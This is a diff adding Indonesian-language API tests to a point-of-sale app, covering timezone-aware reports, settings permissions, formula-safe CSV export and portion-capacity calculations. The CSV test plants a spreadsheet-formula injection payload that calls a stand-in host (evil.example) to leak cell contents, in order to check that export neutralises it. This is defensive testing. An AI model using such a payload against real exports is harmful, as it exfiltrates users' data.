@@ -35,6 +35,12 @@ const must = async (p, opts) => {
   return r.data;
 };
 const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+/** 'YYYY-MM-DD' digeser N hari (aritmetika tanggal murni). */
+const addDaysStr = (day, n) => {
+  const d = new Date(`${day}T00:00:00Z`);
+  d.setUTCDate(d.getUTCDate() + n);
+  return d.toISOString().slice(0, 10);
+};
 
 /** Tunggu proses anak selesai (atau timeout) tanpa menambah jeda bila sudah exit. */
 function waitExit(proc, ms = 4000) {
@@ -534,6 +540,133 @@ describe('penguatan (docs/11)', () => {
     // retur mengembalikan BARANG JADI (karena itu yang terpotong), bukan bahan
     await must(`/sales/${sale.id}/refund`, { method: 'POST', body: { item_id: fin.id, qty: 1, reason: 'uji MTO' } });
     assert.equal(Math.round((await must('/pos/catalog')).finished.find((i) => i.id === fin.id).stock_qty), 5, 'barang jadi kembali');
+  });
+
+  it('zona waktu: hari bisnis laporan, nomor struk & filter tanggal ikut settings.store.timezone', async () => {
+    const { DatabaseSync } = await import('node:sqlite');
+    const dayIn = (tz, at) => new Intl.DateTimeFormat('en-CA', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit' }).format(at);
+
+    // geser zona toko ke dua ekstrem: +14 dan -11 (masing-masing 27 Sep / 26 Sep untuk instan yang sama)
+    const extremes = ['Pacific/Kiritimati', 'Pacific/Midway'];
+    const now = new Date();
+    for (const tz of extremes) {
+      await must('/settings/store', { method: 'PUT', body: { timezone: tz } });
+      const s = await must('/reports/summary');
+      assert.equal(s.period.to, dayIn(tz, now), `default "sampai" harus tanggal bisnis ${tz}`);
+      assert.equal(s.period.from, addDaysStr(s.period.to, -29), '30 hari termasuk hari ini');
+    }
+    assert.ok(extremes.some((tz) => dayIn(tz, now) !== dayIn('UTC', now)),
+      'uji ini hanya bermakna kalau minimal satu zona memang beda tanggal dengan UTC');
+    await must('/settings/store', { method: 'PUT', body: { timezone: 'Asia/Jakarta' } });
+
+    // transaksi pukul 01:00 WIB (= 18:00 UTC hari sebelumnya) harus dihitung pada hari WIB-nya
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan TZ API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 500 } });
+    const fin = await must('/items', { method: 'POST', body: { name: 'Kopi TZ API', item_type: 'finished', selling_price: 9000, production_mode: 'make_to_order', tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 5 }] } });
+    const sale = await must('/sales', { method: 'POST', body: { lines: [{ item_id: fin.id, qty: 1 }] } });
+
+    const wibDay = '2026-06-15';                 // hari yang jauh dari data seed (30 hari terakhir)
+    const utcStamp = '2026-06-14 18:00:00';      // 01:00 WIB tanggal 15 Jun
+    const db = new DatabaseSync(path.join(dataDir, 'kasir.db'));
+    db.prepare(`UPDATE transactions SET created_at = ? WHERE id = ?`).run(utcStamp, sale.id);
+    db.prepare(`UPDATE stock_movements SET created_at = ? WHERE ref_id = ? AND ref_type = 'transaction'`).run(utcStamp, sale.id);
+    db.close();
+
+    const onWibDay = await must(`/reports/summary?from=${wibDay}&to=${wibDay}`);
+    assert.equal(onWibDay.totals.tx_count, 1, 'transaksi 01:00 WIB masuk hari WIB-nya');
+    assert.equal(onWibDay.totals.gross_revenue, 9000);
+    assert.ok(onWibDay.by_hour.some((h) => h.hour === 1), `jam sibuk harus jam 1 WIB, dapat: ${JSON.stringify(onWibDay.by_hour)}`);
+    assert.ok(!onWibDay.by_hour.some((h) => h.hour === 18), 'bukan jam 18 (UTC)');
+
+    const onUtcDay = await must(`/reports/summary?from=2026-06-14&to=2026-06-14`);
+    assert.equal(onUtcDay.totals.tx_count, 0, 'tidak lagi bocor ke tanggal UTC hari sebelumnya');
+
+    // filter tanggal di Riwayat Penjualan & Ledger juga memakai hari bisnis toko
+    const hist = await must(`/sales?from=${wibDay}&to=${wibDay}&limit=200`);
+    assert.ok((hist.items || hist).some((r) => r.id === sale.id), 'struk 01:00 WIB muncul di Riwayat tanggal 15 Jun');
+    const histPrev = await must(`/sales?from=2026-06-14&to=2026-06-14&limit=200`);
+    assert.ok(!(histPrev.items || histPrev).some((r) => r.id === sale.id), 'tidak muncul di tanggal UTC-nya');
+    const movs = await must(`/stock/movements?from=${wibDay}&to=${wibDay}&limit=200`);
+    assert.ok((movs.items || movs).some((m) => m.ref_id === sale.id), 'gerakan stok struk itu ikut terfilter di hari WIB-nya');
+  });
+
+  it('permission per blok setting: setting.store tidak bisa mengubah pajak/tema (docs/11 §7)', async () => {
+    const before = (await must('/roles')).roles.find((r) => r.key === 'manager').permissions;
+    assert.ok(before.includes('setting.tax'), 'manager demo punya setting.tax (dasar uji)');
+    try {
+      // turunkan manager menjadi hanya punya setting.store (seperti pratinjau di UI Hak Akses)
+      await must('/roles/manager', { method: 'PUT', body: { permissions: ['setting.store'] } });
+      await must('/auth/login', { method: 'POST', body: { username: 'rina', password: 'rahasia123' } });
+      token.manager = (await must('/auth/login', { method: 'POST', body: { username: 'rina', password: 'rahasia123' } })).token;
+
+      const tax = await req('/settings/tax', { method: 'PUT', as: 'manager', body: { default_rate_pct: 0, enabled: false } });
+      assert.equal(tax.status, 403, 'mengubah PPN butuh setting.tax: ' + JSON.stringify(tax.data));
+      assert.match(String(tax.data.error), /setting\.tax/);
+
+      const theme = await req('/settings/theme', { method: 'PUT', as: 'manager', body: { app_name: 'Diretas' } });
+      assert.equal(theme.status, 403, 'mengubah tema butuh setting.theme');
+
+      const receipt = await req('/settings/receipt', { method: 'PUT', as: 'manager', body: { footer: 'x' } });
+      assert.equal(receipt.status, 403, 'mengubah struk butuh setting.receipt');
+
+      // blok yang memang haknya tetap boleh
+      const store = await req('/settings/store', { method: 'PUT', as: 'manager', body: { phone: '021-555' } });
+      assert.equal(store.status, 200, 'blok store tetap boleh: ' + JSON.stringify(store.data));
+
+      // PPN tidak berubah (bukti tidak ada efek samping)
+      const taxNow = await must('/settings');
+      assert.notEqual(taxNow.tax.default_rate_pct, 0, 'PPN tidak jadi 0');
+    } finally {
+      await must('/roles/manager', { method: 'PUT', body: { permissions: before } });
+    }
+  });
+
+  it('ekspor CSV menetralkan formula spreadsheet (docs/11 §8)', async () => {
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan CSV API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 500 } });
+    const fin = await must('/items', { method: 'POST', body: { name: 'Kopi CSV API', item_type: 'finished', selling_price: 12000, production_mode: 'make_to_order', tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 5 }] } });
+
+    const payload = '=HYPERLINK("http://evil.example/?c="&A1,"Klik")';
+    const sale = await must('/sales', { method: 'POST', body: { lines: [{ item_id: fin.id, qty: 1 }], customer_name: payload, customer_phone: '+62812-3456' } });
+    const exp = await req('/reports/export/sales', { raw: true });
+    assert.ok(exp.status < 400, `ekspor gagal: ${exp.status} ${exp.text.slice(0, 200)}`);
+    const csv = exp.text;
+    const line = csv.split('\n').find((l) => l.includes(sale.invoice_no));
+    assert.ok(line, 'baris struk ada di CSV');
+    assert.ok(line.includes(`"'=HYPERLINK`), 'nama pelanggan dinetralkan dengan awalan apostrof: ' + line);
+    assert.ok(!/,"?=HYPERLINK/.test(line), 'tidak ada sel yang dimulai dengan = tanpa netralisasi');
+
+    // kolom uang tetap numerik & negatif tidak ikut dinetralkan
+    const head = csv.split('\n')[0].split(',');
+    const cells = line.split(',');
+    const grand = cells[head.indexOf('grand_total')];
+    assert.equal(grand, '12000', `grand_total tetap angka: ${grand}`);
+    const phone = cells[head.indexOf('customer_name')];
+    assert.ok(phone.length > 0);
+  });
+
+  it('kapasitas porsi memakai SATU rumus (yield_pct dihormati di semua endpoint, docs/11 §11)', async () => {
+    const raw = await must('/items', { method: 'POST', body: { name: 'Bahan Yield API', item_type: 'raw', unit: 'gr', cost_price: 100, opening_stock: 1000 } });
+    // rendemen 50%: 10 gr resep -> butuh 20 gr bahan per porsi; 1000 gr -> 50 porsi
+    const fin = await must('/items', { method: 'POST', body: { name: 'Roti Yield API', item_type: 'finished', selling_price: 20000, production_mode: 'make_to_order', yield_pct: 50, tax_mode: 'exempt' } });
+    await must(`/items/${fin.id}/recipe`, { method: 'PUT', body: { recipe: [{ raw_item_id: raw.id, qty: 10 }] } });
+
+    const sim = await must(`/items/${fin.id}/simulate`, { method: 'POST', body: { qty: 1 } });
+    assert.equal(Math.round(sim.deduct_raw[0].qty * 100) / 100, 20, 'mesin stok: 10 gr / 0,5');
+
+    const cap = (await must('/pos/catalog')).finished.find((i) => i.id === fin.id).capacity;
+    assert.equal(cap, 50, `katalog kasir = 50 porsi (dapat ${cap})`);
+    assert.equal(sim.max_servable, cap, `simulate harus sama dengan katalog: ${sim.max_servable} vs ${cap}`);
+
+    const health = (await must('/stock/health')).items.find((i) => i.id === fin.id);
+    assert.equal(health.serve_capacity, cap, `stock/health harus sama: ${health.serve_capacity} vs ${cap}`);
+    assert.equal(sim.deduct_raw[0].qty * sim.max_servable, 1000, 'kapasitas x kebutuhan = stok bahan');
+
+    // salah input ditolak, bukan dibiarkan (mesin stok meng-clamp diam-diam)
+    assert.equal((await req('/items', { method: 'POST', body: { name: 'Yield salah', item_type: 'finished', yield_pct: 150 } })).status, 400, 'yield > 100% ditolak');
+    assert.equal((await req('/items', { method: 'POST', body: { name: 'Yield nol', item_type: 'finished', yield_pct: 0 } })).status, 400, 'yield 0 ditolak');
+    assert.equal((await req(`/items/${fin.id}`, { method: 'PUT', body: { yield_pct: 120 } })).status, 400, 'update pun ditolak');
+    assert.equal((await must(`/items/${fin.id}`)).yield_pct, 50, 'nilai lama tidak berubah setelah penolakan');
   });
 
   it('order tertahan: tahan → daftar → lanjutkan → hapus (dulu 500 storeId is not defined)', async () => {
